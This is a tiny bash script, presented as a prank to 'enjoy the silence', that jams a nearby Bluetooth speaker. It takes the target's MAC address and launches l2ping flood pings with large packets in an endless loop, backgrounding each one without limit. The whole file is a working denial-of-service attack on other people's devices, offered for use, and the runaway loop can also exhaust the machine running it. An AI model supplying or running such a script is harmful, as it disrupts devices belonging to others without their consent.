#!/bin/bash
# Use the annoying speaker's MAC address as the first argument of this bash script and run it with sudo.
# Enjoy the silence!

_mac=$1

while :
do
	l2ping -s 640 -f $_mac & 
done
